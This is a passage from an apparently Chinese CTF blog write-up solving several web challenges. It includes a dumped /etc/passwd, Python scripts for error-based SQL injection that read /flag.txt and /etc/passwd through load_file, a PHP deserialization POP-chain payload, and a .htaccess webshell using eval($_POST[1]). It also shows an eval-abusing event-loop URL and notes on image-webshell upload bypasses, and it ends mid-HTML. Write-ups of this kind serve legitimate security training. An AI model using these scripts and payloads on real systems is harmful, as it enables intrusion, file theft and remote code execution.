</code></pre><p>/etc/passwd</p><pre><code>root:x:0:0:root:/root:/bin/ashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/usr/lib/news:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologinman:x:13:15:man:/usr/man:/sbin/nologinpostmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologincron:x:16:16:cron:/var/spool/cron:/sbin/nologinftp:x:21:21::/var/lib/ftp:/sbin/nologinsshd:x:22:22:sshd:/dev/null:/sbin/nologinat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologinsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologinxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologingames:x:35:35:games:/usr/games:/sbin/nologinpostgres:x:70:70::/var/lib/postgresql:/bin/shcyrus:x:85:12::/usr/cyrus:/sbin/nologinvpopmail:x:89:89::/var/vpopmail:/sbin/nologinntp:x:123:123:NTP:/var/empty:/sbin/nologinsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologinguest:x:405:100:guest:/dev/null:/sbin/nologinnobody:x:65534:65534:nobody:/:/sbin/nologinwww-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologinmysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologinnginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin</code></pre><pre><code>dbf39bacca9e.log</code></pre><p>艹,最后百度下发现flag再flag.txt里面</p><p><code>flag{c90595fb-9a36-4257-ba55-9181d7584edc}</code></p><p>附上脚本:</p><pre><code class="python">import requestsimport randomimport reimport timedef sql_inj(sql):    num=random.randint(0,9999999999)    result=&quot;&quot;    count=1    while True:        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/confirm.php&quot;        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: &quot;&#39;+(updatexml(1,concat(0x7e,substr(({sql}),{count},30),0x7e),1))#&quot;.format(sql=sql,count=count)}        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/change.php&quot;        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/change.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: num}        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)        print(res.text)        tmp=re.match(r&#39;.*~(.*)~.*&#39;,res.text,flags=re.DOTALL).group(1)        result+=tmp        print(result)        if tmp.strip() is &quot;&quot;:            break        count+=30        num+=1        time.sleep(0.5)sql_inj(&quot;SELECT (load_file(&#39;/flag.txt&#39;))&quot;)</code></pre><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>报错后发现thinkphp的壳披着Discuz的皮,观察cookie发现,存在反序列化点</p><p>扫目录后,从<a href="http://www.tar.gz中拿到源码,从源码中很容易构造pop链" target="_blank" rel="noopener">www.tar.gz中拿到源码,从源码中很容易构造pop链</a></p><p>payload:</p><pre><code class="php">&lt;?phpnamespace app\web\controller;use think\Controller;class Index extends Controller{    public $profile;    public $profile_db;    public function index()    {        if($this-&gt;login_check()){            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;            $this-&gt;redirect($curr_url,302);            exit();        }        return $this-&gt;fetch(&quot;index&quot;);    }    public function home(){        if(!$this-&gt;login_check()){            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;            $this-&gt;redirect($curr_url,302);            exit();        }        if(!$this-&gt;check_upload_img()){            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);            return $this-&gt;fetch(&quot;upload&quot;);        }else{            $this-&gt;assign(&quot;img&quot;,$this-&gt;profile_db[&#39;img&#39;]);            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);            return $this-&gt;fetch(&quot;home&quot;);        }    }    public function login_check(){        $profile=cookie(&#39;user&#39;);        if(!empty($profile)){            $this-&gt;profile=unserialize(base64_decode($profile));            #$this-&gt;profile_db=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&#39;ID&#39;]))-&gt;find();            if(array_diff(array(1,1,1),$this-&gt;profile)==null){                return 1;            }else{                return 0;            }        }    }    public function check_upload_img(){        if(!empty($this-&gt;profile) &amp;&amp; !empty($this-&gt;profile_db)){            if(empty($this-&gt;profile_db[&#39;img&#39;])){                return 0;            }else{                return 1;            }        }    }    public function logout(){        cookie(&quot;user&quot;,null);        $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;        $this-&gt;redirect($curr_url,302);        exit();    }    public function test()    {        $a=urldecode(&quot;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Cindex.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&quot;);        $b=substr($a,0,strlen($a)-1);        $b=str_replace(&quot;\&quot;Error\&quot;:7&quot;,&quot;\&quot;Error\&quot;:8&quot;,$b);        $b.=&quot;s:3:\&quot;aaa\&quot;;&quot;.serialize(new Register()).&quot;}&quot;;        $b=&#39;a:6:{s:2:&quot;ID&quot;;i:9;s:8:&quot;username&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;img&quot;;N;s:5:&quot;email&quot;;s:11:&quot;cao0@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;74b87337454200d4d33f80c4663dc5e5&quot;;s:3:&quot;abc&quot;;&#39;.$b.&#39;}&#39;;        #return &quot;a&quot;;        return urlencode(base64_encode($b));    }    public function __get($name)    {        return url;    }}</code></pre><pre><code class="php">&lt;?phpnamespace app\web\controller;use think\Controller;class Register extends Controller{    public $checker;    public $registed;    public function __construct()    {        $this-&gt;registed=0;        $this-&gt;checker=new Profile();    }    public function register()    {        if ($this-&gt;checker) {            if($this-&gt;checker-&gt;login_check()){                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;                $this-&gt;redirect($curr_url,302);                exit();            }        }        if (!empty(input(&quot;post.username&quot;)) &amp;&amp; !empty(input(&quot;post.email&quot;)) &amp;&amp; !empty(input(&quot;post.password&quot;))) {            $email = input(&quot;post.email&quot;, &quot;&quot;, &quot;addslashes&quot;);            $password = input(&quot;post.password&quot;, &quot;&quot;, &quot;addslashes&quot;);            $username = input(&quot;post.username&quot;, &quot;&quot;, &quot;addslashes&quot;);            if($this-&gt;check_email($email)) {                if (empty(db(&quot;user&quot;)-&gt;where(&quot;username&quot;, $username)-&gt;find()) &amp;&amp; empty(db(&quot;user&quot;)-&gt;where(&quot;email&quot;, $email)-&gt;find())) {                    $user_info = [&quot;email&quot; =&gt; $email, &quot;password&quot; =&gt; md5($password), &quot;username&quot; =&gt; $username];                    if (db(&quot;user&quot;)-&gt;insert($user_info)) {                        $this-&gt;registed = 1;                        $this-&gt;success(&#39;Registed successful!&#39;, url(&#39;../index&#39;));                    } else {                        $this-&gt;error(&#39;Registed failed!&#39;, url(&#39;../index&#39;));                    }                } else {                    $this-&gt;error(&#39;Account already exists!&#39;, url(&#39;../index&#39;));                }            }else{                $this-&gt;error(&#39;Email illegal!&#39;, url(&#39;../index&#39;));            }        } else {            $this-&gt;error(&#39;Something empty!&#39;, url(&#39;../index&#39;));        }    }    public function check_email($email){        $pattern = &quot;/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/&quot;;        preg_match($pattern, $email, $matches);        if(empty($matches)){            return 0;        }else{            return 1;        }    }    public function __destruct()    {        if(!$this-&gt;registed){            $this-&gt;checker-&gt;index();        }    }}</code></pre><pre><code class="php">&lt;?phpnamespace app\web\controller;use think\Controller;class Profile extends Controller{    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except=array(&#39;index&#39;=&gt;&#39;upload_img&#39;);    public $index;    public function __construct()    {        $this-&gt;index=&quot;upload_img&quot;;        $this-&gt;checker=0;        $this-&gt;ext=1;        $this-&gt;filename_tmp=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png&quot;;        $this-&gt;filename=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.php&quot;;    }    public function upload_img(){        if($this-&gt;checker){            if(!$this-&gt;checker-&gt;login_check()){                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;                $this-&gt;redirect($curr_url,302);                exit();            }        }        if(!empty($_FILES)){            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;            $this-&gt;ext_check();        }        if($this-&gt;ext) {            if(getimagesize($this-&gt;filename_tmp)) {                @copy($this-&gt;filename_tmp, $this-&gt;filename);                @unlink($this-&gt;filename_tmp);                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;                $this-&gt;update_img();            }else{                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));            }        }else{            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));        }    }    public function update_img(){        $user_info=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img){            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update()){                $this-&gt;update_cookie();                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;../home&#39;));            }else{                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;../index&#39;));            }        }    }    public function update_cookie(){        $this-&gt;checker-&gt;profile[&#39;img&#39;]=$this-&gt;img;        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);    }    public function ext_check(){        $ext_arr=explode(&quot;.&quot;,$this-&gt;filename);        $this-&gt;ext=end($ext_arr);        if($this-&gt;ext==&quot;png&quot;){            return 1;        }else{            return 0;        }    }    public function __get($name)    {        return $this-&gt;except[$name];    }    public function __call($name, $arguments)    {        if($this-&gt;{$name}){            $this-&gt;{$this-&gt;{$name}}($arguments);        }    }}</code></pre><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>简单的smarty ssti</p><h2 id="Futurella"><a href="#Futurella" class="headerlink" title="Futurella"></a>Futurella</h2><p>F12</p><h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="2020 新春红包题 1"></a>2020 新春红包题 1</h2><p>和2019的eis中的pop一摸一样,我之前也做出来了,再看的时候居然不会了???????????</p><p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p><p>唯一不同的是,这题会对文件名进行检测</p><pre><code class="php">public function getCacheKey(string $name): string {        // 使缓存文件名随机        $cache_filename = $this-&gt;options[&#39;prefix&#39;] . uniqid() . $name;        if(substr($cache_filename, -strlen(&#39;.php&#39;)) === &#39;.php&#39;) {            die(&#39;?&#39;);        }        return $cache_filename;    }</code></pre><p>我在这里卡了好久,还是去偷窥wp解决的</p><p>我们利用<code>uniqid()/../filename</code>来绕过uniqid,</p><p>利用<code>index.php/.</code>=<code>index.php</code>来绕过后缀名检测</p><p>其他解法: <a href="https://www.zhaoj.in/read-6397.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6397.html</a> </p><ol><li>利用.user.ini</li><li>利用shell中``的优先级大于”来命令执行</li></ol><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code class="php">&lt;?php    $files = scandir(&#39;./&#39;);     foreach($files as $file) {        if(is_file($file)){            if ($file !== &quot;index.php&quot;) {                unlink($file);            }        }    }    include_once(&quot;fl3g.php&quot;);    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {        highlight_file(__FILE__);        die();    }    $content = $_GET[&#39;content&#39;];    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {        echo &quot;Hacker&quot;;        die();    }    $filename = $_GET[&#39;filename&#39;];    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {        echo &quot;Hacker&quot;;        die();    }    $files = scandir(&#39;./&#39;);     foreach($files as $file) {        if(is_file($file)){            if ($file !== &quot;index.php&quot;) {                unlink($file);            }        }    }    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);?&gt;</code></pre><p>可以任意写文件,写个php文件后发现,不解析,估计是htaccess的,</p><p>于是写htaccess,利用<code>#\</code>来绕过末尾添加<code>\nJust one chance</code>,将其注释</p><p>最后的payload</p><pre><code>#&lt;?php die(eval($_POST[1]));?&gt;php_value auto_prepend_fi\le &quot;.htaccess&quot;#\</code></pre><h2 id="Kookie"><a href="#Kookie" class="headerlink" title="Kookie"></a>Kookie</h2><p>修改cookie</p><h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><pre><code class="python">from flask import Flask, session, request, Responseimport urllibapp = Flask(__name__)app.secret_key = &#39;*********************&#39;  # censoredurl_prefix = &#39;/d5afe1f66147e857&#39;def FLAG():    return &#39;*********************&#39;  # censoreddef trigger_event(event):    session[&#39;log&#39;].append(event)    if len(session[&#39;log&#39;]) &gt; 5:        session[&#39;log&#39;] = session[&#39;log&#39;][-5:]    if type(event) == type([]):        request.event_queue += event    else:        request.event_queue.append(event)def get_mid_str(haystack, prefix, postfix=None):    haystack = haystack[haystack.find(prefix)+len(prefix):]    if postfix is not None:        haystack = haystack[:haystack.find(postfix)]    return haystackclass RollBackException:    passdef execute_event_loop():    valid_event_chars = set(        &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;)    resp = None    while len(request.event_queue) &gt; 0:        # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;        event = request.event_queue[0]        request.event_queue = request.event_queue[1:]        if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)):            continue        for c in event:            if c not in valid_event_chars:                break        else:            is_action = event[0] == &#39;a&#39;            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)            try:                event_handler = eval(                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))                ret_val = event_handler(args)            except RollBackException:                if resp is None:                    resp = &#39;&#39;                resp += &#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39;                resp += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;                session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;]                session[&#39;points&#39;] = request.prev_session[&#39;points&#39;]                break            except Exception, e:                if resp is None:                    resp = &#39;&#39;                # resp += str(e) # only for debugging                continue            if ret_val is not None:                if resp is None:                    resp = ret_val                else:                    resp += ret_val    if resp is None or resp == &#39;&#39;:        resp = (&#39;404 NOT FOUND&#39;, 404)    session.modified = True    return resp@app.route(url_prefix+&#39;/&#39;)def entry_point():    querystring = urllib.unquote(request.query_string)    request.event_queue = []    if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100:        querystring = &#39;action:index;False#False&#39;    if &#39;num_items&#39; not in session:        session[&#39;num_items&#39;] = 0        session[&#39;points&#39;] = 3        session[&#39;log&#39;] = []    request.prev_session = dict(session)    trigger_event(querystring)    return execute_event_loop()# handlers/functions below --------------------------------------def view_handler(args):    page = args[0]    html = &#39;&#39;    html += &#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;.format(        session[&#39;num_items&#39;], session[&#39;points&#39;])    if page == &#39;index&#39;:        html += &#39;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39;        html += &#39;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39;        html += &#39;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39;    elif page == &#39;shop&#39;:        html += &#39;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39;    elif page == &#39;reset&#39;:        del session[&#39;num_items&#39;]        html += &#39;Session reset.&lt;br /&gt;&#39;    html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;    return htmldef index_handler(args):    bool_show_source = str(args[0])    bool_download_source = str(args[1])    if bool_show_source == &#39;True&#39;:        source = open(&#39;eventLoop.py&#39;, &#39;r&#39;)        html = &#39;&#39;        if bool_download_source != &#39;True&#39;:            html += &#39;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39;            html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;        for line in source:            if bool_download_source != &#39;True&#39;:                html += line.replace(&#39;&amp;&#39;, &#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(                    &#39; &#39;, &#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;, &#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;)            else:                html += line        source.close()        if bool_download_source == &#39;True&#39;:            headers = {}            headers[&#39;Content-Type&#39;] = &#39;text/plain&#39;            headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39;            return Response(html, headers=headers)        else:            return html    else:        trigger_event(&#39;action:view;index&#39;)def buy_handler(args):    num_items = int(args[0])    if num_items &lt;= 0:        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])    session[&#39;num_items&#39;] += num_items    trigger_event([&#39;func:consume_point;{}&#39;.format(        num_items), &#39;action:view;index&#39;])def consume_point_function(args):    point_to_consume = int(args[0])    if session[&#39;points&#39;] &lt; point_to_consume:        raise RollBackException()    session[&#39;points&#39;] -= point_to_consumedef show_flag_function(args):    flag = args[0]    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.    return &#39;You naughty boy! ;) &lt;br /&gt;&#39;def get_flag_handler(args):    if session[&#39;num_items&#39;] &gt;= 5:        # show_flag_function has been disabled, no worries        trigger_event(&#39;func:show_flag;&#39; + FLAG())    trigger_event(&#39;action:view;index&#39;)if __name__ == &#39;__main__&#39;:    app.run(debug=False, host=&#39;0.0.0.0&#39;)</code></pre><p>我们观察:</p><pre><code class="python">            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)            try:                event_handler = eval(                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))                ret_val = event_handler(args)</code></pre><p>这里我们可以</p><p>在action后面加个#,来达到任意命令执行,但是传入的参数只能是一个list,在这里卡住我了</p><p>继续分析发现,这个程序的功能都基于自制的event_loop,而trigger_event()负责添加event,当传入一个list时,他会直接event+=list</p><p>也就是说我们可以控制event_loop的执行顺序,</p><p>在get_flag_handler中,我们可以将flag记录到session中但是,要求diomand&gt;=5,而正常来说我们最多只有3个</p><p>我们观察buy</p><pre><code class="python">def buy_handler(args):    num_items = int(args[0])    if num_items &lt;= 0:        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])    session[&#39;num_items&#39;] += num_items    trigger_event([&#39;func:consume_point;{}&#39;.format(        num_items), &#39;action:view;index&#39;])</code></pre><p>这个是先将物品添加然后向event_loop中添加事件,结合我们前面的发现,我们可以在调用buy_handler后直接调用get_flag_handler,这样我们就能拿到flag了</p><p>访问:<code>d5afe1f66147e857/?action:trigger_event%23;action:buy;99%23action:get_flag;%23</code>,将session解码后拿到flag</p><p><code>flag{ba772083-fe23-4258-897e-63c9a99ff66f}</code></p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code class="python">import requestsimport re,timeimport binasciidef sql_inj(sql):    result=&quot;&quot;    count=1    while True:        if result!=&quot;&quot;:            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),{result},\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))        else:            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),\&quot;\&quot;,\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))        burp0_url = &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn:80/register.php&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;r658aaumj82f5f6itd5freua14&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Origin&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;username&quot;:username , &quot;password&quot;: &quot;a&quot;, &quot;email&quot;: &quot;a&quot;}        res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)        print(username)        #print(res.text)        session = requests.session()        url=&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/login.php&quot;        data={            &quot;username&quot;:username,            &quot;password&quot;:&quot;a&quot;        }        res=session.post(url, data=data)         #print(res.text)        res=session.post(&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/changepwd.php&quot;,data={&quot;oldpass&quot;:&quot;a&quot;,&quot;newpass&quot;:&quot;a&quot;})        print(res.text)        tmp=re.match(r&quot;.*XPATH syntax error: &#39;(.*)&#39;.*&quot;,res.text,flags=re.DOTALL).group(1)        if tmp!=&quot;&quot; and tmp[0]==&quot;~&quot;:            tmp=tmp[1:]        if tmp!=&quot;&quot; and tmp[-1]==&quot;~&quot;:            tmp=tmp[:-1]         result+=tmp        print(result)        if tmp.strip() is &quot;&quot;:            break        count+=30        time.sleep(0.5)    print(result)sql_inj(&quot;select(group_concat(load_file(0x2f6574632f706173737764)))&quot;)</code></pre><pre><code>article,flag,usersflagtitle,contentname,pwd,email,real_flag_1s_here</code></pre><p><code>flag{9b73df68-406f-439e-9076-c9a9f37f5255}</code></p><p>二次注入</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>easy</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>后缀名限制:php</p><p>上传htaccess+图片马</p><p><code>flag{c4ab5af4-4cb4-45bf-9cb3-ebe35922eca9}</code></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>修改xff头</p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>测试发现</p><pre><code>Warning: include(meowers&#39;.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37Warning: include(): Failed opening &#39;meowers&#39;.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 37</code></pre><p>index.php</p><pre><code class="php">&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;    &lt;title&gt;Had a bad day?&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;          &lt;div 